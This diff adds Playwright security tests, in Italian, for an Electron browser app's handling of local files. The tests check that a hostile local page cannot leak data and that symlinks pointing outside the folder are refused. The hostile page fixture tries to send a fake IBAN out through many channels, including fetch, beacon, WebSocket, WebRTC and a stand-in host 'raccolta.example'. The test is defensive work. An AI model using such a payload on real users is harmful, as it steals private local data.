@@ -366,3 +366,119 @@ test('chiusa, la scheda del file torna con Ctrl+Shift+T', async ({ app }) => {
   await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.riapriChiusa());
   await expect.poll(() => schedaFile(app, '2026-10-30-riquadro.html'), { timeout: 10_000 }).toBeTruthy();
 });
+
+// Il server di chi ruberebbe: conta ogni connessione e ogni pacchetto che gli arriva, da qualunque strada.
+async function raccoglitore() {
+  const arrivi = [];
+  const server = createServer((req, res) => { arrivi.push(`http ${req.url}`); res.writeHead(200, { 'Access-Control-Allow-Origin': '*' }); res.end('ok'); });
+  server.on('connection', () => arrivi.push('tcp'));
+  server.on('upgrade', (req, s) => { arrivi.push(`ws ${req.url}`); s.destroy(); });
+  await new Promise((r) => server.listen(0, '127.0.0.1', r));
+  const udp = createSocket('udp4');
+  udp.on('message', () => arrivi.push('udp'));
+  await new Promise((r) => udp.bind(0, '127.0.0.1', r));
+  return {
+    arrivi, origine: `http://127.0.0.1:${server.address().port}`, udp: udp.address().port,
+    chiudi: () => { server.close(); udp.close(); },
+  };
+}
+
+test('una pagina del computer ostile vede le immagini della cartella ma non ne legge i punti, e non raggiunge nessun indirizzo', async ({ app, avvisi }) => {
+  test.setTimeout(60_000);
+  const { dir } = preparaReport();
+  const r = await raccoglitore();
+  try {
+    writeFileSync(join(dir, 'dati.json'), '{"conto":"IBAN-SEGRETO"}');
+    writeFileSync(join(dir, 'fattura.html'), `<!doctype html><meta charset="utf-8"><title>Fattura</title>
+<body><img id="f" src="foto.png"><a id="web" href="${r.origine}/collegamento">sito</a><script>
+const SRV = ${JSON.stringify(r.origine)};
+const esito = {};
+const segna = (k, v) => { esito[k] = v; document.body.dataset.esito = JSON.stringify(esito); };
+let rifiuti = 0;
+document.addEventListener('securitypolicyviolation', (e) => { if (/^https:/.test(e.blockedURI)) segna('https', ++rifiuti); });
+const finito = (el, k) => new Promise((ok) => { el.onload = () => { segna(k, 'PARTITO'); ok(); }; el.onerror = () => { segna(k, 'NO'); ok(); }; });
+window.addEventListener('load', async () => {
+  const img = document.getElementById('f');
+  const c = document.createElement('canvas'); c.width = img.naturalWidth; c.height = img.naturalHeight;
+  const g = c.getContext('2d'); g.drawImage(img, 0, 0);
+  let dati = 'vuoto';
+  try { dati = g.getImageData(0, 0, 1, 1).data.join('-'); segna('pixel', 'LETTO'); } catch (e) { segna('pixel', e.name); }
+  try { dati = c.toDataURL().slice(30, 60); segna('dataurl', 'LETTO'); } catch (e) { segna('dataurl', e.name); }
+  try { const m = await import('./dati.json', { with: { type: 'json' } }); dati = m.default.conto; segna('json', 'LETTO'); } catch (e) { segna('json', 'NO'); }
+  const q = encodeURIComponent(dati);
+  try { await fetch(SRV + '/fetch?d=' + q, { mode: 'no-cors' }); segna('fetch', 'PARTITO'); } catch (e) { segna('fetch', 'NO'); }
+  try { segna('beacon', navigator.sendBeacon(SRV + '/beacon', dati) ? 'ACCODATO' : 'NO'); } catch (e) { segna('beacon', 'NO'); }
+  try { new EventSource(SRV + '/eventi?d=' + q); } catch (e) {}
+  try { const ws = new WebSocket(SRV.replace('http', 'ws') + '/ws?d=' + q); ws.onopen = () => segna('ws', 'PARTITO'); } catch (e) {}
+  const im = new Image(); const imFatto = finito(im, 'img'); im.src = SRV + '/img?d=' + q;
+  const css = document.createElement('link'); css.rel = 'stylesheet'; const cssFatto = finito(css, 'css'); css.href = SRV + '/css?d=' + q; document.head.appendChild(css);
+  const js = document.createElement('script'); const jsFatto = finito(js, 'js'); js.src = SRV + '/js?d=' + q; document.head.appendChild(js);
+  for (const rel of ['preconnect', 'dns-prefetch', 'prefetch']) { const l = document.createElement('link'); l.rel = rel; l.href = SRV + '/' + rel; document.head.appendChild(l); }
+  const v = document.createElement('video'); v.src = SRV + '/video?d=' + q; document.body.appendChild(v);
+  const f = document.createElement('iframe'); f.src = SRV + '/riquadro?d=' + q; document.body.appendChild(f);
+  const st = document.createElement('style'); st.textContent = '@font-face{font-family:x;src:url(' + SRV + '/font)} body{font-family:x;background:url(' + SRV + '/sfondo?d=' + q + ')}'; document.head.appendChild(st);
+  try {
+    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${r.udp}' }] });
+    pc.createDataChannel('x'); await pc.setLocalDescription(await pc.createOffer()); segna('rtc', 'PROVATO');
+  } catch (e) { segna('rtc', 'NO'); }
+  const h = new Image(); const hFatto = finito(h, 'imgHttps'); h.src = 'https://raccolta.example/p.png?d=' + q;
+  try { await fetch('https://raccolta.example/?d=' + q); segna('fetchHttps', 'PARTITO'); } catch (e) { segna('fetchHttps', 'NO'); }
+  await Promise.all([imFatto, cssFatto, jsFatto, hFatto]);
+  segna('fine', 1);
+});
+</script></body>`);
+    await home(app);
+    const file = join(dir, 'fattura.html');
+    expect((await execAction(app, { type: 'NAVIGA', url: file }, { parole: `aprimi ${file}` })).executed).toBe(true);
+    let id = null;
+    await expect.poll(async () => (id = await schedaFile(app, 'fattura.html')), { timeout: 10_000 }).toBeTruthy();
+    await app.evaluate(({ BrowserWindow }, i) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.activate(i), id);
+    const pagina = await paginaDellaScheda(app, id, (p) => p.url().startsWith('file:'));
+    const esito = async () => JSON.parse((await pagina.locator('body').getAttribute('data-esito')) || '{}');
+    await expect.poll(async () => (await esito()).fine, { timeout: 15_000 }).toBe(1);
+    expect(await pagina.evaluate(() => document.getElementById('f').naturalWidth), 'l\'immagine della cartella si vede').toBeGreaterThan(0);
+    const e = await esito();
+    expect(e, 'la tela sporcata non dà i punti, e il file accanto non si legge come dati').toMatchObject({ pixel: 'SecurityError', dataurl: 'SecurityError', json: 'NO' });
+    expect(e).toMatchObject({ fetch: 'NO', img: 'NO', css: 'NO', js: 'NO', imgHttps: 'NO', fetchHttps: 'NO' });
+    expect(e.https, 'immagine e fetch verso https li rifiuta la pagina stessa').toBeGreaterThanOrEqual(2);
+
+    // Anche con un clic dell'utente e da uno script, nessun salto e nessuna finestra porta i dati sul web.
+    await pagina.locator('#web').click();
+    await pagina.evaluate((s) => { window.open(`${s}/finestra?d=x`); location.href = `${s}/salto?d=x`; }, r.origine);
+    // E la sessione stessa non esce, nemmeno a chiederglielo dal main.
+    const dalMain = await app.evaluate(async ({ BrowserWindow, session }, { i, u }) => {
+      const t = BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.tabs.find((x) => x.id === i);
+      try { await session.fromPartition(t.partition).fetch(u); return 'PARTITO'; } catch (_) { return 'NO'; }
+    }, { i: id, u: `${r.origine}/main` });
+    expect(dalMain).toBe('NO');
+    await expect((await avvisi()).locator('.shell-notif.show', { hasText: 'Le pagine aperte dal computer si mostrano senza rete' })).toBeVisible({ timeout: 8000 });
+    await pagina.waitForTimeout(2000);
+    expect(pagina.url(), 'la scheda resta sul file').toMatch(/fattura\.html$/);
+    expect(await schedeFile(app)).toBe(1);
+    expect(r.arrivi, 'al server di chi ruberebbe non arriva niente').toEqual([]);
+    mkdirSync(SHOTS, { recursive: true });
+    await pagina.screenshot({ path: join(SHOTS, 'file-del-computer-senza-rete.png') });
+  } finally { r.chiudi(); }
+});
+
+test('un collegamento simbolico verso un file fuori dalla cartella non si apre, né come immagine né come pagina', async ({ app }) => {
+  test.skip(process.platform === 'win32', 'i collegamenti simbolici su Windows chiedono i permessi di amministratore');
+  const { dir, fuori } = preparaReport();
+  writeFileSync(join(fuori, 'altra.html'), '<!doctype html><title>Altra</title><p>fuori</p>');
+  symlinkSync(join(fuori, 'privata.png'), join(dir, 'collegata.png'));
+  symlinkSync(join(fuori, 'altra.html'), join(dir, 'collegata.html'));
+  writeFileSync(join(dir, 'indice.html'), '<!doctype html><title>Indice</title><img id="c" src="collegata.png"><img id="v" src="foto.png"><a id="l" href="collegata.html">altra</a>');
+  await home(app);
+  const file = join(dir, 'indice.html');
+  expect((await execAction(app, { type: 'NAVIGA', url: file }, { parole: `aprimi ${file}` })).executed).toBe(true);
+  let id = null;
+  await expect.poll(async () => (id = await schedaFile(app, 'indice.html')), { timeout: 10_000 }).toBeTruthy();
+  const pagina = await paginaDellaScheda(app, id, (p) => p.url().startsWith('file:'));
+  await expect.poll(() => pagina.evaluate(() => document.getElementById('v').naturalWidth)).toBeGreaterThan(0);
+  expect(await pagina.evaluate(() => document.getElementById('c').naturalWidth)).toBe(0);
+  expect(await leggeLaScheda(app, id, pathToFileURL(join(dir, 'collegata.png')).href)).toBe(403);
+  expect(await leggeLaScheda(app, id, pathToFileURL(join(dir, 'collegata.html')).href)).toBe(403);
+  await pagina.locator('#l').click();
+  await pagina.waitForTimeout(1500);
+  expect(await pagina.title()).not.toBe('Altra');
+});
